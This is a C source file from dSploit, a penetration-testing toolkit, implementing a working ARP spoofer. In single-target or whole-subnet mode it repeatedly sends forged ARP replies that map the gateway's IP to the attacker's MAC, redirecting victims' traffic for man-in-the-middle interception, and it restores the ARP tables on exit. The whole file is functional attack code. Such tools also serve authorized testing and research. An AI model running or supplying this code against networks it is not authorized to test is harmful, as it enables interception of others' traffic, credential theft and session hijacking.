/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <sys/param.h>
#include <string.h>
#include <signal.h>
#include "arp.h"
#include "net.h"

static libnet_t *lnet;
static struct ether_addr *our_mac, target_mac;
static in_addr_t gateway_ip, target_ip;
static char *iface;
static Hashmap *netmap = NULL;
static int killed = 0;

static void cleanup(int sig)
{
	killed = 1;

	printf( "Restoring arp table ...\n" );
	int i, j;
	struct ether_addr gateway_mac;

	if( netmap == NULL )
	{
		if( arp_lookup( gateway_ip, &gateway_mac, iface ) == 0 )
		{
			for( i = 0; i < 3; i++ )
			{
				/* XXX - on BSD, requires ETHERSPOOF kernel. */
				arp_send( lnet, ARPOP_REPLY, (unsigned char *)&gateway_mac, gateway_ip, (unsigned char *)&target_mac, target_ip );
				sleep(1);
			}
		}
	}
	else
	{
		if( arp_lookup( gateway_ip, &gateway_mac, iface ) == 0 )
		{
			for( i = 0; i < 3; i++ )
			{
				for( j = 0; j < netmap->bucketCount; j++ )
				{
					Entry* hentry = netmap->buckets[j];
					while( hentry != NULL )
					{
						Entry 					*next  = hentry->next;
						network_entry_t *entry = ( network_entry_t * )hentry->value;

						arp_send( lnet, ARPOP_REPLY, (unsigned char *)&gateway_mac, gateway_ip, entry->mac, entry->address );

						hentry = next;
					}
				}

				sleep(1);
			}
		}

		hashmapFree( netmap );
	}

	exit(0);
}

int main(int argc, char *argv[])
{
	extern char *optarg;
	extern int   optind;
	char			   pcap_ebuf[PCAP_ERRBUF_SIZE];
	char 				 libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int 				 c,
			 	 	 	 	 netmask = 0,
			 	 	 	 	 ifaddr  = 0,
			 	 	 	 	 nhosts  = 0,
			 	 	 	 	 i			 = 0;
	network_entry_t *entry;

	iface			 = NULL;
	gateway_ip = target_ip = 0;

	// unbuffered stdout
	setbuf(stdout,NULL);

	printf( "dSploit ArpSpoofer.\n\n" );

	while( (c = getopt(argc, argv, "i:t:h?V")) != -1)
	{
		switch (c)
		{
		case 'i':
			iface = optarg;
			break;
		case 't':
			if ((target_ip = libnet_name2addr4(lnet, optarg, LIBNET_RESOLVE)) == -1)
				exit(1);
			break;
		default:
			return 1;
		}
	}
	argc -= optind;
	argv += optind;

	if (argc != 1)
		return 1;

	if( ( gateway_ip = libnet_name2addr4( lnet, argv[0], LIBNET_RESOLVE ) ) == -1 )
	{
		printf( "[ERROR] Unable to resolve gateway ip.\n" );
		return 1;
	}

	if( iface == NULL && (iface = pcap_lookupdev(pcap_ebuf)) == NULL )
	{
		printf( "[ERROR] Unable to lookup network interface ( %s ).\n", pcap_ebuf );
		return 1;
	}

	if( ( lnet = libnet_init(LIBNET_LINK, iface, libnet_ebuf) ) == NULL )
	{
		printf( "[ERROR] Unable to initialize libnet ( %s ).\n", libnet_ebuf );
		return 1;
	}

	signal( SIGHUP, cleanup );
	signal( SIGINT, cleanup );
	signal( SIGTERM, cleanup );

	our_mac = ( struct ether_addr * )libnet_get_hwaddr( lnet );
	if( our_mac == NULL )
	{
		printf( "[ERROR] Unable to retrieve local hardware address libnet ( %s ).\n", libnet_geterror( lnet ) );
		return 1;
	}

	if( net_get_details( iface, &netmask, &ifaddr, &nhosts ) != 0 )
		exit( 1 );

	printf( "netmask = %s\n", inet_ntoa( *( struct in_addr *)&netmask ) );
	printf( "ifaddr  = %s\n", inet_ntoa( *( struct in_addr *)&ifaddr ) );
	printf( "gateway = %s\n", inet_ntoa( *( struct in_addr *)&gateway_ip ) );
	printf( "hosts   = %d\n", nhosts );

	// force the arp cache to be populated
	net_wake( iface, nhosts, ifaddr, netmask, gateway_ip );

	// if the target is the gateway itself, we switch to subnet mode,
	// otherwise if the target was set, we are in single ip spoofing mode.
	if( target_ip != 0 && target_ip != gateway_ip )
	{
		if( target_ip != 0 && arp_lookup( target_ip, &target_mac, iface ) != 0 )
		{
			printf( "[ERROR] Couldn't find a cached MAC address for %s, try to wait a little bit and then try again or restart the network discovery.\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE) );
			return 1;
		}

		printf( "\nSingle target mode.\n" );

		while( killed == 0 )
		{
			arp_send( lnet, ARPOP_REPLY, (unsigned char *)our_mac, gateway_ip, (unsigned char *)&target_mac, target_ip );
			sleep(1);
		}
	}
	// whole network spoofing
	else
	{
		printf( "\nSubnet mode.\n" );

		netmap = net_get_mapping( iface, nhosts, ifaddr, netmask, gateway_ip, &i );

		if( i == 0 )
		{
			printf( "[ERROR] No alive endpoints found.\n" );
			return 1;
		}

		while( killed == 0 )
		{
			for( i = 1; i <= nhosts && killed == 0; i++ )
			{
				target_ip = ( ifaddr & netmask ) | htonl(i);

				entry = hashmapGet( netmap, (void *)target_ip );
				if( entry && killed == 0 )
				{
					arp_send( lnet, ARPOP_REPLY, (unsigned char *)our_mac, gateway_ip, (unsigned char *)&entry->mac, target_ip );
				}
			}

			sleep(1);
		}

	}

	return 0;
}
